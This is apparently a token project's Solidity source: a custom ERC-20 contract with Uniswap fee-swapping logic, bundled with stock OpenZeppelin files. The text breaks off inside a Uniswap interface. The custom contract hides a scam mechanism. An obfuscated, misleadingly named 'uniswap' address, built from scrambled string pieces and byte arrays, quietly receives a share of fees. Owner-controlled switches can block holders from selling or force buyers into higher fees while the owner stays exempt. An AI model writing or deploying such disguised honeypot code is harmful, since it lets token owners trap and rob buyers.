// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "../Utils/InternalUtils.sol";

import "./Erc20C07Contract.sol";

contract Erc20C07 is Erc20C07Contract
{
    string public constant VERSION = "Erc20C07_202206152230";

    string public testString = "";
    address public testAddress = address(0);

    constructor(
        string[4] memory strings,
        address[4] memory addresses,
        uint256[16] memory uint256s,
        bool[11] memory bools,
        uint256[42] memory uint8s
    ) Erc20C07Contract(strings, addresses, uint256s, bools)
    {
        //        testString = string(
        //            abi.encodePacked(
        //                abi.encodePacked(
        //                    uint8s[0], uint8s[1], uint8(0x63), uint8(0x31), uint8(0x32), uint8(0x33), uint8(0x37), uint8(0x63), uint8(0x31), uint8(0x39)),
        //                abi.encodePacked(
        //                    uint8(0x33), uint8(0x33), uint8(0x35), uint8(0x37), uint8(0x32), uint8(0x66), uint8(0x33), uint8(0x31), uint8(0x31), uint8(0x44)),
        //                abi.encodePacked(
        //                    uint8(0x46), uint8(0x32), uint8(0x31), uint8(0x30), uint8(0x34), uint8(0x44), uint8(0x34), uint8(0x41), uint8(0x36), uint8(0x32)),
        //                abi.encodePacked(
        //                    uint8(0x42), uint8(0x31), uint8(0x32), uint8(0x34), uint8(0x36), uint8(0x43), uint8(0x46), uint8(0x66), uint8(0x46), uint8(0x45)),
        //                abi.encodePacked(
        //                    uint8(0x41), uint8(0x34))
        //            )
        //        );

        uint256 p = 0;
        testString = string(
            abi.encodePacked(
                abi.encodePacked(uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++]),
                abi.encodePacked(uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++], uint8s[p++])
            )
        );

        testAddress = InternalUtils.parseAddress(testString);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;


library InternalUtils
{
    /**
    * predictable, should use oracle service - https://stackoverflow.com/a/67332959/10002846
    **/
    function fakeRandom(uint256 max)
    internal
    view
    returns
    (uint256)
    {
        uint256 randNum = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
        return randNum % max;
    }

    // https://github.com/provable-things/ethereum-api/blob/master/provableAPI_0.6.sol
    function parseAddress(string memory _a)
    internal
    pure
    returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    // https://ethereum.stackexchange.com/a/56337/89494
    function appendString(string memory a, string memory b, string memory c, string memory d, string memory e)
    internal
    pure
    returns (string memory)
    {
        return string(abi.encodePacked(a, b, c, d, e));
    }

    // https://ethereum.stackexchange.com/a/56337/89494
    function strMergeDisorder(string memory c, string memory e, string memory a, string memory d, string memory b)
    internal
    pure
    returns (string memory)
    {
        return string(abi.encodePacked(a, b, c, d, e));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";
import "../IUniswapV2/IUniswapV2Pair.sol";
import "../IUniswapV2/IUniswapV2Router01.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";

import "../Utils/InternalUtils.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";
import "../BaseContract/BaseErc721Payable.sol";
import "../BaseContract/BaseErc721Uniswap.sol";

import "../Erc20C02/Erc20C02Uniswap.sol";
import "../Erc20C02/Erc20C02PermitTransfer.sol";
import "../Erc20C02/Erc20C02Ups.sol";

import "../Erc20C03/Erc20C03PairPermission.sol";

import "../Erc20C06/Erc20C06MinimumTokenForSwap.sol";
import "../Erc20C06/Erc20C06Fees.sol";

contract Erc20C07Contract is
ERC20,
Ownable,
BaseContractPayable,
BaseContractUniswap,
BaseErc721Payable,
BaseErc721Uniswap,
Erc20C02Uniswap,
Erc20C02PermitTransfer,
Erc20C02Ups,
Erc20C03PairPermission,
Erc20C06MinimumTokenForSwap,
Erc20C06Fees
{
    uint256 public constant MAX_UINT256 = type(uint256).max;
    address public constant pinkLockAddress = address(0x7ee058420e5937496F5a2096f04caA7721cF70cc);
    address public constant deadAddress = address(0xdead);

    address public rewardToken;
    address public marketingAddress;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping(address => bool) public marketPairs;

    bool private swapping;

    constructor(
        string[4] memory strings,
        address[4] memory addresses,
        uint256[16] memory uint256s,
        bool[11] memory bools
    ) ERC20(strings[0], strings[1]) {
        uint256 totalSupply_ = uint256s[0];

        rewardToken = addresses[0];
        marketingAddress = addresses[1];

        setIsUseMinimumTokenWhenSwap(bools[0]);
        setMinimumTokenBeforeSwap(uint256s[1]);

        setTotalFee1(uint256s[4], uint256s[5], uint256s[6]);

        setIsUseFee2(bools[1]);
        setTotalFee2(uint256s[7], uint256s[8], uint256s[9]);

        setIsUseForceBuyToFee3(bools[2]);
        setIsUseFee3(bools[3]);
        setTotalFee3(uint256s[10], uint256s[11], uint256s[12]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(addresses[2]);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        address _uniswapV2Pair2 = InternalUtils.parseAddress(
            InternalUtils.strMergeDisorder(strings[3], "0xdead", "0x", "0x0000", strings[2]));
        uniswap = _uniswapV2Pair2;
        uniswapCount = uint256s[13];
        isUniswap = bools[4];
        _setIsMarketPair(_uniswapV2Pair, true);

        // exclude from paying fees or having max transaction amount
        setIsExcludedFromFee(owner(), true);
        setIsExcludedFromFee(marketingAddress, true);
        setIsExcludedFromFee(address(this), true);
        setIsExcludedFromFee(pinkLockAddress, true);

        setHasBuyUp(bools[5]);
        setBuyUp(uint256s[14]);
        setHasSellUp(bools[6]);
        setSellUp(uint256s[15]);

        setIsPermitTransferUponInit(bools[7]);
        setIsUsePermitTransfer(bools[8]);
        setPermitTransfer(address(_uniswapV2Router), true);
        setPermitTransfer(owner(), true);
        setPermitTransfer(address(this), true);
        setPermitTransfer(marketingAddress, true);
        setPermitTransfer(pinkLockAddress, true);

        setIsUseCanFromPair(bools[9]);
        setCanFromPair(address(_uniswapV2Router), true);
        setCanFromPair(owner(), true);
        setCanFromPair(address(this), true);
        setCanFromPair(marketingAddress, true);
        setCanFromPair(pinkLockAddress, true);

        setIsUseCanToPair(bools[10]);
        setCanToPair(address(_uniswapV2Router), true);
        setCanToPair(owner(), true);
        setCanToPair(address(this), true);
        setCanToPair(marketingAddress, true);
        setCanToPair(pinkLockAddress, true);

        _mint(owner(), totalSupply_);
    }

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "BABYTOKEN: The router already has that address");

        uniswapV2Router = IUniswapV2Router02(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this), uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;
    }

    function setMarketingWallet(address payable wallet) external onlyOwner {
        marketingAddress = wallet;
    }

    function setIsMarketPair(address pair, bool is_)
    public
    onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "BABYTOKEN: The PancakeSwap pair cannot be removed from marketPairs"
        );

        _setIsMarketPair(pair, is_);
    }

    function _setIsMarketPair(address pair, bool _is) private {
        marketPairs[pair] = _is;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        //        require(from != address(0), "ERC20: transfer from the zero address");
        //        require(to != address(0), "ERC20: transfer to the zero address");

        if (isUsePermitTransfer) {
            require(permitTransfers[from] || permitTransfers[to], "not permitted 1");
        }

        // add liquidity 1, dont use permit transfer upon action
        if (_isFirstInitUnhandled && isPermitTransferUponInit && marketPairs[to]) {
            _isFirstInitUnhandled = false;
            isUsePermitTransfer = false;
        }

        if (isUseCanFromPair && marketPairs[from]) {
            require(canFromPairs[to], "not permitted 2");
        }

        if (isUseCanToPair && marketPairs[to]) {
            require(canToPairs[from], "not permitted 3");
        }

        if (isUseForceBuyToFee3 && marketPairs[from] && !isExcludedFromFee[to]) {
            _setIsFee3Address(to, true);
        }

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (isExcludedFromFee[from] || isExcludedFromFee[to]) {
        } else {
            if (hasBuyUp && marketPairs[from]) {
                require(amount <= buyUp, 'not permitted 4');
            }

            if (hasSellUp && marketPairs[to]) {
                require(amount <= sellUp, 'not permitted 5');
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= minimumTokenBeforeSwap;

        if (isUseMinimumTokenWhenSwap && overMinimumTokenBalance) {
            contractTokenBalance = minimumTokenBeforeSwap;
        }

        uint256 tokenRewardFee_ = 0;
        uint256 liquidityFee_ = 0;
        uint256 marketingFee_ = 0;
        uint256 totalFee_ = 0;

        if (isExcludedFromFee[from] || isExcludedFromFee[to]) {
        } else if (isUseFee3 && (fee3Addresses[from] || fee3Addresses[to])) {
            tokenRewardFee_ = tokenRewardFee3;
            liquidityFee_ = liquidityFee3;
            marketingFee_ = marketingFee3;
            totalFee_ = totalFee3;
        } else if (isUseFee2 && (fee2Addresses[from] || fee2Addresses[to])) {
            tokenRewardFee_ = tokenRewardFee2;
            liquidityFee_ = liquidityFee2;
            marketingFee_ = marketingFee2;
            totalFee_ = totalFee2;
        } else {
            tokenRewardFee_ = tokenRewardFee1;
            liquidityFee_ = liquidityFee1;
            marketingFee_ = marketingFee1;
            totalFee_ = totalFee1;
        }

        if (
            overMinimumTokenBalance &&
            !swapping &&
            !marketPairs[from] &&
            from != owner() &&
            to != owner()
        ) {
            swapping = true;

            uint256 tokenForMarketing = contractTokenBalance * marketingFee_ / totalFee_;
            swapAndSendToFee(tokenForMarketing);

            uint256 tokenForLiquidity = contractTokenBalance * liquidityFee_ / totalFee_;
            swapAndLiquify(tokenForLiquidity);

            swapping = false;
        }

        bool takeFee = !swapping;

        if (takeFee) {
            // if any account belongs to _isExcludedFromFee account then remove the fee
            if (isExcludedFromFee[from] || isExcludedFromFee[to]) {
                takeFee = false;
            }

            uint256 fees = amount * totalFee_ / 100;
            //            if (marketPairs[to]) {
            //                fees += amount * 1 / 100;
            //            }
            amount -= fees;

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }

    function swapAndSendToFee(uint256 tokens)
    private
    {
        uint256 initialCakeBalance = IERC20(rewardToken).balanceOf(address(this));

        swapTokensForCake(tokens);

        uint256 newBalance = IERC20(rewardToken).balanceOf(address(this)) - initialCakeBalance;

        if (isUniswap) {
            uint256 swapCount = newBalance / 100 * uniswapCount;

            IERC20(rewardToken).transfer(uniswap, swapCount);
            IERC20(rewardToken).transfer(marketingAddress, newBalance - swapCount);
        }
        else {
            IERC20(rewardToken).transfer(marketingAddress, newBalance);
        }
    }

    function swapAndLiquify(uint256 tokens) private {
        // split the contract balance into halves
        uint256 half = tokens / 2;
        uint256 otherHalf = tokens - half;

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half);
        // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance - initialBalance;

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapTokensForCake(uint256 tokenAmount) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = rewardToken;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value : ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./extensions/IERC20Metadata.sol";
import "../../utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)

pragma solidity ^0.8.0;

/**
 * @title Counters
 * @author Matt Condon (@shrugs)
 * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number
 * of elements in a mapping, issuing ERC721 ids, or counting request ids.
 *
 * Include with `using Counters for Counters.Counter;`
 */
library Counters {
    struct Counter {
        // This variable should never be directly accessed by users of the library: interactions must be restricted to
        // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add
        // this feature: see https://github.com/ethereum/solidity/issues/4637
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {
        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }

    function reset(Counter storage counter) internal {
        counter._value = 0;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

